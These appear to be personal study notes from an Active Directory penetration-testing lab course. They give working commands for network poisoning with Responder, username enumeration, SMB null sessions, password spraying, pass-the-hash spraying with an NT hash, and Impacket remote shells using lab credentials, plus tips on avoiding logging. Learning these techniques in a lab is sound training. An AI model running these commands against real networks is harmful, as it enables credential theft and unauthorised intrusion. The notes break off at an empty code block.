**POINTS TO LOOK FOR IN THIS PHASE**

- AD Users - enumerate valid user accounts we can target for password spraying 

- AD Joined Computers - computers including *domain controllers* , *file servers* , *SQL Servers* , *web servers* , *mail servers* , *database servers*

- key services - kerberos , Netbios , LDAP , DNS

- vulnerable hosts and services - anything that can be quick win ( an esy host to exploit and gain foothold)

**FOR INITIALS WE DID MONITOR NETWORK TRAFFIC TO GET TO KNOW ABOUT WHAT IS HAPPEININNG WE FOUND ARP AND MDNS PACKETS , WE FOUND SOME HOST**

USED TOOLS HERE 
- TCPDUMP
- WIRESHARK (GUI)
- NET-CREDS 
- NETMINER
- PKTMON.EXE(WINDOWS 10 BUILTIN)

AND THE ONE WHICH I DIDNT EXPECT TO SEE HERE **RESPONDER** TO ANALYZE NETWORK TRAFFIC 

[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses.

```BASH
sudo responder -I ens224 -A
```

**PINGING ACTIVE HOST ON THE NETWORK WITH FPING**

Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on.

Here we'll start `fping` with a few flags: `a` to show targets that are alive, `s` to print stats at the end of the scan, `g` to generate a target list from the CIDR network, and `q` to not show per-target results.

```BASH
fping -asgq 172.16.5.0/23
```

 We can combine the successful results and the information we gleaned from our passive checks into a list for a more detailed scan with Nmap

**NMAP SCANNING**
 it would be wise of us to focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few. Below is a quick example of a simple Nmap scan.

```BASH
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

**KERBRUTE - INTERNAL AD USERNAME ENUMERATION**
 It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts
 - We will use Kerbrute in conjunction with the `jsmith.txt` or `jsmith2.txt`user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective.
 -  We can point Kerbrute at the DC we found earlier and feed it a wordlist.
 - To get started with Kerbrute, we can download [precompiled binaries](https://github.com/ropnop/kerbrute/releases/latest)

```SHELL
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

## PASSWORD POLICY
#### ENUMERATING THE PASSWORD POLICY FROM LINUX - CREDENTIALED

- password policy can also be obtained remotely using tools such as [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or `rpcclient` .
```SHELL
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
OR 
```SHELL
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

#### Enumerating the Password Policy - from Linux - SMB NULL Sessions
- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy
- When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as `enum4linux`, `CrackMapExec`, `rpcclient`, etc.

```shell
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
```

**USING ENUM4LINUX**
```SHELL
enum4linux -P 172.16.5.5
```

- The tool [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) is a rewrite of `enum4linux` in Python, but has additional features such as the ability to export data as YAML or JSON files

```SHELL
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

#### Enumerating Null Session - from Windows
```SHELL
net use \\host\ipc$ "" /u:""

net use \\DC01\ipc$ "" /u:""
```

#### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

- With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., to pull the password policy. With [ldapsearch](https://linux.die.net/man/1/ldapsearch), it can be a bit cumbersome but doable. One example command to get the password policy is as follows:

```SHELL
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

*Note: In newer versions of `ldapsearch`, the `-h` parameter was deprecated in favor for `-H`.*

#### Enumerating the Password Policy - from Windows
 If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as `net.exe` to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.

#### Using PowerView


```powershell
PS C:\htb> import-module .\PowerView.ps1 
PS C:\htb> Get-DomainPolicy Unicode        : @{Unicode=yes} SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;                  PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;                 LSAAnonymousNameLookup=0} KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1} Version        : @{signature="$CHICAGO$"; Revision=1} RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]} Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI                  NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9} GPODisplayName : Default Domain Policy
```

- PowerView gave us the same output as our `net accounts` command, just in a different format but also revealed that password complexity is enabled (`PasswordComplexity=1`).
- - Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (`Password1` or `Welcome1` would satisfy the "complexity" requirement here, but are still clearly weak passwords).

The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:

| Policy                                      | Default Value |
| ------------------------------------------- | ------------- |
| Enforce password history                    | 24 days       |
| Maximum password age                        | 42 days       |
| Minimum password age                        | 1 day         |
| Minimum password length                     | 7             |
| Password must meet complexity requirements  | Enabled       |
| Store passwords using reversible encryption | Disabled      |
| Account lockout duration                    | Not set       |
| Account lockout threshold                   | 0             |
| Reset account lockout counter after         | Not set       |

## PASSWORD SPRAYING - MAKING A TARGET USER LIST
There are several ways that we can gather a target list of valid users:

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist

#### SMB NULL Session to Pull User List
If you already have credentials for a domain user or `SYSTEM` access on a Windows host, then you can easily query Active Directory for this information.
It’s possible to do this using the SYSTEM account because it can `impersonate` the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). 

*Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include [enum4linux](https://github.com/portcullislabs/enum4linux), [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html), and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with `enum4linux` with the `-U` flag.*

#### Using enum4linux
```SHELL
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

#### Using rpcclient
We can use the `enumdomusers` command after connecting anonymously using `rpcclient`.

```SHELL
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

#### Using CrackMapExec --users Flag

Finally, we can use `CrackMapExec` with the `--users` flag. This is a useful tool that will also show the `badpwdcount` (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the `baddpwdtime`, which is the date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.

```SHELL
crackmapexec smb 172.16.5.5 --users
```

#### Gathering Users with LDAP Anonymous

We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include [windapsearch](https://github.com/ropnop/windapsearch) and [ldapsearch](https://linux.die.net/man/1/ldapsearch). If we choose to use `ldapsearch` we will need to specify a valid LDAP search filter

```SHELL
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

#### Using windapsearch
```SHELL
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Enumerating Users with Kerbrute
 This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying

 This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts.

 *However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.*
 
. The [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using `Kerbrute`

```SHELL
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy.

If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.

#### Using CrackMapExec with Valid Credentials
```SHELL
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

# Internal Password Spraying - from Linux

#### Using a Bash one-liner for the Attack
```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### Using Kerbrute for the Attack
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

#### Using CrackMapExec & Filtering Logon Failures
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### Validating the Credentials with CrackMapExec
```shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Local Administrator Password Reuse

Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine

#### Local Admin Spraying with CrackMapExec

```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

*One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.*

# Internal Password Spraying - from Windows

From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

 we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain.

#### Using DomainPasswordSpray.ps1
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

There are several options available to us with the tool. Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.

*We could also utilize Kerbrute to perform the same user enumeration and spraying*

## Enumerating Security Controls

#### Windows Defender

Windows Defender (or [Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as `PowerView`

We can use the built-in PowerShell cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps) to get the current Defender status. we can see that the `RealTimeProtectionEnabled` parameter is set to `True`, which means Defender is enabled on the system.

```powershell
Get-MpComputerStatus
```

#### AppLocker
[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.
Organizations also often focus on blocking the `PowerShell.exe` executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### PowerShell Constrained Language Mode

PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.[[Powershell Language Modes]]

```powershell
$ExecutionContext.SessionState.LanguageMode
```

#### LAPS
```powershell
Find-LAPSDelegatedGroups
```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.

```powerhshell
Find-AdmPwdExtendedRights
```

We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

```powershell
Get-LAPSComputers
```


# Credentialed Enumeration - from Linux

We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more. We have various options available, but the most important thing to remember is that most of these tools will not work without valid domain user credentials at any permission level. So at a minimum, we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.

#### CrackMapExec or NetExec

We'll start by using the SMB protocol to enumerate users and groups. We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in. Make sure you preface all commands with `sudo`.
#### CME - Domain User Enumeration

```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

#### CME - Domain Group Enumeration

```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

The above snippet lists the groups within the domain and the number of users in each. The output also shows the built-in groups on the Domain Controller, such as `Backup Operators`. We can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.
#### CME - Logged On Users

```shell
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

#### CME Share Searching

```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

##### Spider_plus
 ```shell
 sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
 ```
we can dig into the shares and spider each directory looking for files. The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.
CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`

#### SMBMap
 we can use SMBMap to recursively list directories, list the contents of a directory, search file contents, and more.
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

#### Recursive List Of All Directories
```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

The use of `--dir-only` provided only the output of all directories and did not list all files.

#### rpcclient
[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD.

##### NULL SMB SESSION 
```shell
rpcclient -U "" -N 172.16.5.5
```

#### rpcclient Enumeration

- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
- So the domain user `htb-student` with a RID:0x457 Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.

#### RPCClient User Enumeration By RID
```shell
rpcclient $> queryuser 0x457
```

#### Enumdomusers

 If we wished to enumerate all users to gather the RIDs for more than just one, we would use the `enumdomusers` command.

```shell
rpcclient $> enumdomusers
```

*Our enumeration can go into great detail utilizing rpcclient. We could even start performing actions such as editing users and groups or adding our own into the domain, but this is out of scope for this module*

## Impacket Toolkit

#### Psexec.py
The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

*To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.*

```shell
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

#### wmiexec.py
Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.

```shell
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

Note that this shell environment is not fully interactive, *so each command issued will execute a new cmd.exe from WMI and execute your command.* The downside of this is that if a vigilant defender checks event logs and looks at event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688), they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation. In the image above, it's also apparent that the process is running under the context of user `wley` on the host, not as SYSTEM

#### Windapsearch
enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries

*We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.*

##### Windapsearch - Domain Admins
```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

##### #### Windapsearch - Privileged Users
```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

 check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of *users with excess privileges from nested group membership*.
 
#### BLOODHOUND.PY
 The tool uses [graph theory](https://en.wikipedia.org/wiki/Graph_theory) to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://specterops.io/blog/2017/09/18/bloodhound-intro-to-cypher/).

The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from

```SHELL
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

The command above executed Bloodhound.py with the user `forend`. We specified our nameserver as the Domain Controller with the `-ns` flag and the domain, INLANEFREIGHt.LOCAL with the `-d` flag. The `-c all` flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>

#### Upload the Zip File into the BloodHound GUI
```SHELL
sudo neo4j start
```

zip all the json files 
```shell
zip -r ilfreight_bh.zip *.json
```

upload the file and go to analysis flags 

the `Database Info` tab after uploading data, search for a node such as `Domain Users` and, scroll through all of the options under the `Node Info` tab, check out the pre-built queries under the `Analysis` tab, many which are powerful and can quickly find various ways to domain takeover. Finally, experiment with some custom Cypher queries


# https://wadcoms.github.io/
a curatred list of cheatsheet to work with active directory

## Credentialed Enumeration - from Windows

 The [Get-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) cmdlet, which is part of the [Microsoft.PowerShell.Core module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-7.2), will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed.

If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.

it will only load the module from disk , to download a module from the internet we need `install-module` commandlet 

#### activedirectory module - get domain info 
```powershell
get-addomain
```

#### Get-ADUser
```powershell

```